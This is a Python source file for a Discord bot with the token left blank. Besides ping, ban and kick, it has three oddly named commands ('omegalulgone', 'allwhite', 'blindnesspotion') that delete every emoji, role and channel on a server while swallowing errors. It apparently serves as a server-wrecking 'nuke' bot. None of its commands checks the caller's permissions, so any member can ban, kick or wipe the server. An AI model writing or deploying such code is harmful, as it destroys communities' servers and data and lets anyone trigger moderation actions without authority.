import discord
from discord.ext import commands
from discord.flags import Intents
import logging

bottk=""

intents=discord.Intents(messages = True, guilds = True, reactions = True, members = True, presences = True)
client=commands.Bot(command_prefix='!', intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print("You're ready to rumble!")

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! Latency is {client.latency*1000}ms')

@client.command()
async def ban(ctx, member: discord.Member, Reason=None):
    await member.ban(reason=Reason)
    await ctx.send(f"The user **{member}** has been banned!")

@client.command()
async def kick(ctx, member: discord.Member, Reason=None):
    await member.kick(reason=Reason)
    await ctx.send(f"The user **{member}** has been kicked!")

@client.command()
async def omegalulgone(ctx):
    
    all_emoji= await ctx.guild.fetch_emojis()
    for emoji in all_emoji:
        await emoji.delete()
    print("Emojis have been taken to the back and shot in the head!")

@client.command()
async def allwhite(ctx):
    all_roles= await ctx.guild.fetch_roles()
    for role in all_roles:
        try:
            await role.delete()
        except:
            pass
    print("Roles have been taken care of")

@client.command()
async def blindnesspotion(ctx):
    all_channels= await ctx.guild.fetch_channels()
    for channel in all_channels:
        try:
            await channel.delete()
        except:
            pass
    print("Channels have been taken care of...")

@client.command()
async def help(ctx):
    await ctx.send("The help command is being created! Hang on tight!")

client.run(bottk)